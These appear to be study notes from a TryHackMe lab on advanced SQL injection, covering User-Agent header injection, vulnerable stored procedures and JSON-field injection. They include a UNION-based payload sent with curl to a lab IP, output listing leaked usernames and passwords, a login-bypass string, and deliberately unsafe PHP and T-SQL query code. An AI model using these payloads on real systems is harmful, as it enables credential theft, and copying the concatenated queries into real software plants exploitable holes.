Advanced SQL injection involves a range of sophisticated methods that go beyond basic attacks. Here are a few important advanced techniques that pentesters should be aware of:

## HTTP Header Injection
HTTP headers can carry user input, which might be used in SQL queries on the server side. If these inputs are not sanitised, it can lead to SQL injection. The technique involves manipulating HTTP headers (like **User-Agent**, **Referer**, or **X-Forwarded-For**) to inject SQL commands. The server might log these headers or use them in SQL queries. For example, a malicious User-Agent header would look like `User-Agent: ' OR 1=1; --`. If the server includes the User-Agent header in an SQL query without sanitizing it, it can result in SQL injection.

In this example, a web application logs the User-Agent header from HTTP requests into a table named logs in the database. The application provides an endpoint at `http://10.10.205.210/httpagent/` that displays all the logged entries from the logs table. When users visit a webpage, their browser sends a User-Agent header, which identifies the browser and operating system. This header is typically used for logging purposes or to tailor content for specific browsers. In our application, this User-Agent header is inserted into the logs table and can then be viewed through the provided endpoint.

Given the endpoint, an attacker might attempt to inject SQL code into the User-Agent header to exploit SQL injection vulnerabilities. For instance, by setting the User-Agent header to a malicious value such as `User-Agent: ' UNION SELECT username, password FROM user; --`, an attacker attempts to inject SQL code that combines the results from the logs table with sensitive data from the user table.

Here is the server-side code that inserts the logs.
```php
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$insert_sql = "INSERT INTO logs (user_Agent) VALUES ('$userAgent')";
if ($conn->query($insert_sql) === TRUE) {
    echo "<p class='text-green-500'>New logs inserted successfully</p>";
} else {
    echo "<p class='text-red-500'>Error: " . $conn->error . " (Error Code: " . $conn->errno . ")</p>";
}

$sql = "SELECT * FROM logs WHERE user_Agent = '$userAgent'";
..
...
```

The User-Agent value is inserted into the logs table using an INSERT SQL statement. If the insertion is successful, a success message is displayed. An error message with details is shown if there is an error during insertion.
	![](Pasted%20image%2020241211181205.png)

### **Payload**
We will prepare and inject an SQL payload into the `User-Agent` header to demonstrate how SQL injection can be exploited through HTTP headers.

Our target payload will be `' UNION SELECT username, password FROM user; #.` This payload is designed to:
- **Close the Existing String Literal**: The initial single quote (`'`) is used to close the existing string literal in the SQL query.
- **Inject a UNION SELECT Statement**: The `UNION SELECT username, password FROM user;` part of the payload is used to retrieve the username and password columns from the user table.
- **Comment Out the Rest of the Query**: The `#` character is used to comment out the remainder of the SQL query, ensuring that any subsequent SQL code is ignored.

We need to send this payload as part of the User-Agent header in our HTTP request to inject this payload, which could be done using tools like **Burp Suite** or **cURL**. We will use the curl command-line tool to send an HTTP request with a custom User-Agent header. Open a Terminal and access your command line interface. Use the following command to send the request with the custom `User-Agent` header:

The server's response will be displayed in the terminal. If the SQL injection is successful, you will see the extracted data (usernames and passwords) in the response.
```shell-session
user@tryhackme$ curl -H "User-Agent: ' UNION SELECT username, password FROM user; # " http://10.10.205.210/httpagent/           !!!
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SQL Injection </title>
 rel="stylesheet">
</head>
<body class="bg-gray-100">
    <div class="container mx-auto p-8">
        <h1 class="text-4xl font-bold mb-8 text-center">HTTP Logs</h1>
        <div class="bg-white p-6 rounded-lg shadow-lg">

<p class='text-gray-600 text-sm mb-4'>Generated SQL Query: <span class='text-red-500'>SELECT * FROM logs WHERE user_Agent = '' UNION SELECT username, password FROM user; #'</span></p><div class='p-4 bg-gray-100 rounded shadow mb-4'><p class='font-bold'>id: <span class='text-gray-700'>bob</span></p><p class='font-bold'>user_Agent: <span class='text-gray-700'>bob@123</span></p></div><div class='p-4 bg-gray-100 rounded shadow mb-4'><p class='font-bold'>id: <span class='text-gray-700'>attacker</span></p><p class='font-bold'>user_Agent: <span class='text-gray-700'>tesla</span></p></div>
        </div>
    </div>
</body>
</html>
```

## Exploiting Stored Procedures
Stored procedures are routines stored in the database that can perform various operations, such as inserting, updating, or querying data. While stored procedures can help improve performance and ensure consistency, they can also be vulnerable to SQL injection if not properly handled.
![](Pasted%20image%2020241211182059.png)

Stored procedures are precompiled SQL statements that can be executed as a single unit. They are stored in the database and can be called by applications to perform specific tasks. Stored procedures can accept parameters, which can make them flexible and powerful. However, if these parameters are not properly sanitised, they can introduce SQL injection vulnerabilities.

Consider a stored procedure designed to retrieve user data based on a username:
```sql
CREATE PROCEDURE sp_getUserData
    @username NVARCHAR(50)
AS
BEGIN
    DECLARE @sql NVARCHAR(4000)
    SET @sql = 'SELECT * FROM users WHERE username = ''' + @username + ''''
    EXEC(@sql)
END
```

In this example, the stored procedure concatenates the @username parameter into a dynamic SQL query. This approach is vulnerable to SQL injection because the input is not sanitised.

## XML and JSON Injection
Applications that parse XML or JSON data and use the parsed data in SQL queries can be vulnerable to injection if they do not properly sanitise the inputs. XML and JSON injection involves injecting malicious data into XML or JSON structures that are then used in SQL queries. This can occur if the application directly uses parsed values in SQL statements.

```json
{
  "username": "admin' OR '1'='1--",
  "password": "password"
}
```

If the application uses these values directly in a SQL query like `SELECT * FROM users WHERE username = 'admin' OR '1'='1'-- AND password = 'password'`, it could result in an injection.
	![](Pasted%20image%2020241211185016.png)

